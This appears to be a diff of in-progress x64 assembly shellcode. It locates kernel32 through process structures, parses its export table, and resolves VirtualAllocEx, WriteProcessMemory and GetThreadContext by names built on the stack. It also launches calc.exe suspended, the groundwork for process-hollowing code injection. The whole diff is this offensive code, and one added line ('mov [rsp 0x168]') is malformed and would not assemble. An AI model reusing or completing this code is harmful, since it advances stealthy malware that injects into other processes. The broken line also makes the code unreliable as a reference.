@@ -26,12 +26,11 @@ main:
 	mov qword rax, [r12]
 	mov qword rax, [rax]
 	mov qword r14, [rax + 0x20]
-	;mov qword r14, [r12 + 0x5a0]
 
 	;0x3c should be where we find the offset to the PE structure.
 	mov rax, r14
 	add rax, 0x3c
-	movzx rdi, byte [rax]			;byte loaded offset stored in rdi.
+	movzx rdi, byte [rax]		;byte loaded offset stored in rdi.
 
 	;Get a pointer to kernel32 PE structure.
 	mov qword rax, r14
@@ -45,7 +44,7 @@ main:
 	add rax, 0x70			;per microsoft, the export table offset (RVA) should be 0x70 away from our optional header.
 
 	;Pointer to the Export Directory Table.
-	mov edi, dword [rax]			;should be offset thats added to the image base; pointer directory table.
+	mov edi, dword [rax]		;should be offset thats added to the image base; pointer directory table.
 	mov qword rax, r14
 	add rax, rdi
 	mov qword r12, rax
@@ -138,50 +137,74 @@ contn:
 	test rax, rax				;will be 0x01 if data exists here.
 	jz initProcA
 	mov rax, [rsp + 0x158]
-	test rax, rax				;will be 0x01 if data exists here.
+	test rax, rax
 	jz initSI
 	mov rax, [rsp + 0x160]
-	test rax, rax				;will be 0x01 if data exists here.
+	test rax, rax
 	jz initEP
+	mov rax, [rsp + 0x168]
+	test rax, rax
+	jz initVA
+	mov rax, [rsp + 0x170]
+	test rax, rax
+	jz initPM
+	mov rax, [rsp + 0x178]
+	test rax, rax
+	jz initTC
 
 initProcA:
 	mov qword rax, rsi
-	mov [rsp + 0x150], rax		;CreateProcessA on the stack via pointer.
+	mov [rsp + 0x150], rax			;CreateProcessA on the stack via pointer.
 	jmp FindSI
 
 initSI:
 	mov qword rax, rsi
-	mov [rsp + 0x158], rax		;GetStartupInfoW on the stack via pointer.
+	mov [rsp + 0x158], rax			;GetStartupInfoW on the stack via pointer.
 	jmp callSI
 
 initEP:
 	mov qword rax, rsi
-	mov [rsp + 0x160], rax
-	jmp CrtPrc
+	mov [rsp + 0x160], rax			;ExitProcess on the stack via pointer.
+	jmp FindVA
+
+initVA:
+	mov qword rax, rsi
+	mov [rsp 0x168], rax			;VirtualAllocEX on the stack via pointer.
+	jmp FindPM
+
+initPM:
+	mov qword rax, rsi
+	mov [rsp + 0x170], rax			;WriteProcessMemory on the stack via pointer.
+	jmp FindTC
+
+initTC:
+	mov qword rax, rsi
+	mov [rsp + 0x178], rax			;GetThreadContext on the stack via pointer.
+	;Work on SetThreadContext next.
 
 	;Now find GetStartupInfoW.
-;	;Set up the STARTUPINFOA Struct.
-;	;------------------------------------
-;	;typedef struct _STARTUPINFOA {
-;	;  DWORD  cb;
-;	;  LPSTR  lpReserved;
-;	;  LPSTR  lpDesktop;
-;	;  LPSTR  lpTitle;
-;	;  DWORD  dwX;
-;	;  DWORD  dwY;
-;	;  DWORD  dwXSize;
-;	;  DWORD  dwYSize;
-;	;  DWORD  dwXCountChars;
-;	;  DWORD  dwYCountChars;
-;	;  DWORD  dwFillAttribute;
-;	;  DWORD  dwFlags;
-;	;  WORD   wShowWindow;
-;	;  WORD   cbReserved2;
-;	;  LPBYTE lpReserved2;
-;	;  HANDLE hStdInput;
-;	;  HANDLE hStdOutput;
-;	;  HANDLE hStdError;
-;	;} STARTUPINFOA, *LPSTARTUPINFOA;
+	;Set up the STARTUPINFOA Struct.
+	;------------------------------------
+	;typedef struct _STARTUPINFOA {
+	;  DWORD  cb;
+	;  LPSTR  lpReserved;
+	;  LPSTR  lpDesktop;
+	;  LPSTR  lpTitle;
+	;  DWORD  dwX;
+	;  DWORD  dwY;
+	;  DWORD  dwXSize;
+	;  DWORD  dwYSize;
+	;  DWORD  dwXCountChars;
+	;  DWORD  dwYCountChars;
+	;  DWORD  dwFillAttribute;
+	;  DWORD  dwFlags;
+	;  WORD   wShowWindow;
+	;  WORD   cbReserved2;
+	;  LPBYTE lpReserved2;
+	;  HANDLE hStdInput;
+	;  HANDLE hStdOutput;
+	;  HANDLE hStdError;
+	;} STARTUPINFOA, *LPSTARTUPINFOA;
 
 	;VOID GetStartupInfoW(
 	;  [out] LPSTARTUPINFOW lpStartupInfo
@@ -203,7 +226,9 @@ callSI:
 	lea qword rcx, [rsp + 0x200]
 	mov rax, [rsp + 0x158]
 	call rax
+	jmp FindEP
 
+	;Find ExitProcess.
 FindEP:
 	mov eax, 0x74697845 
 	mov [rsp + 0x100], rax
@@ -213,9 +238,48 @@ FindEP:
 	mov [rsp + 0x108], rax
 	jmp FindName
 
+	;Find VirtualAlloc.
+FindVA:
+	mov eax, 0x74726956 
+	mov [rsp + 0x100], rax
+	mov eax, 0x416c6175 
+	mov [rsp + 0x104], rax
+	mov eax, 0x636f6c6c
+	mov [rsp + 0x108], rax
+	mov eax, 0x00007845
+	mov [rsp + 0x10c], rax
+	jmp FindName
+
+	;Find WriteProcessMemory.
+FindPM:
+	mov eax, 0x74697257 
+	mov [rsp + 0x100], rax
+	mov eax, 0x6f725065 
+	mov [rsp + 0x104], rax
+	mov eax, 0x73736563 
+	mov [rsp + 0x108], rax
+	mov eax, 0x6f6d654d 
+	mov [rsp + 0x10c], rax
+	mov eax, 0x00007972
+	mov [rsp + 0x110], rax
+	jmp FindName
+
+	;Find GetThreadContext.
+FindTC:
+	mov eax, 0x54746547 
+	mov [rsp + 0x100], rax
+	mov eax, 0x61657268 
+	mov [rsp + 0x104], rax
+	mov eax, 0x6e6f4364 
+	mov [rsp + 0x108], rax
+	mov eax, 0x74786574
+	mov [rsp + 0x10c], rax
+	jmp FindName
+
+
+	;Call CreateProcess WinAPI with arguments.
 CrtPrc:
-;	;Call CreateProcess WinAPI with arguments.
-;	;------------------------------------
+	;------------------------------------
 	;typedef struct _PROCESS_INFORMATION {
 	;  HANDLE hProcess;
 	;  HANDLE hThread;
@@ -223,18 +287,18 @@ CrtPrc:
 	;  DWORD  dwThreadId;
 	;} PROCESS_INFORMATION, *PPROCESS_INFORMATION, *LPPROCESS_INFORMATION;
 
-;	;BOOL CreateProcessA(
-;	;  [in, optional]      LPCSTR                lpApplicationName,
-;	;  [in, out, optional] LPSTR                 lpCommandLine,
-;	;  [in, optional]      LPSECURITY_ATTRIBUTES lpProcessAttributes,
-;	;  [in, optional]      LPSECURITY_ATTRIBUTES lpThreadAttributes,
-;	;  [in]                BOOL                  bInheritHandles,
-;	;  [in]                DWORD                 dwCreationFlags,
-;	;  [in, optional]      LPVOID                lpEnvironment,
-;	;  [in, optional]      LPCSTR                lpCurrentDirectory,
-;	;  [in]                LPSTARTUPINFOA        lpStartupInfo,
-;	;  [out]               LPPROCESS_INFORMATION lpProcessInformation
-;	;);
+	;BOOL CreateProcessA(
+	;  [in, optional]      LPCSTR                lpApplicationName,
+	;  [in, out, optional] LPSTR                 lpCommandLine,
+	;  [in, optional]      LPSECURITY_ATTRIBUTES lpProcessAttributes,
+	;  [in, optional]      LPSECURITY_ATTRIBUTES lpThreadAttributes,
+	;  [in]                BOOL                  bInheritHandles,
+	;  [in]                DWORD                 dwCreationFlags,
+	;  [in, optional]      LPVOID                lpEnvironment,
+	;  [in, optional]      LPCSTR                lpCurrentDirectory,
+	;  [in]                LPSTARTUPINFOA        lpStartupInfo,
+	;  [out]               LPPROCESS_INFORMATION lpProcessInformation
+	;);
 
 	;433a5c57696e646f77735c53797374656d33325c63616c632e6578655c30	<- Null terminated "C:\\Windows\\System32\\calc.exe".
 	;6578652e636c61635c32336d65747379535c73776f646e69575c3a43	<- Little endian w/o null termination.
@@ -257,7 +321,7 @@ CrtPrc:
 	xor r8, r8
 	xor r9, r9
 	mov qword [rsp + 0x20], 0x0000000000000001
-	mov qword [rsp + 0x28], 0x0000000000000010
+	mov qword [rsp + 0x28], 0x0000000000000004
 	mov qword [rsp + 0x30], 0x0000000000000000
 	mov qword [rsp + 0x38], 0x0000000000000000
 	lea qword rax, [rsp + 0x200]
@@ -266,7 +330,7 @@ CrtPrc:
 	mov qword [rsp + 0x48], rax
 	mov qword rax, [rsp + 0x150]
 	call rax
-
+	
 
 endit:
 	;Exit process
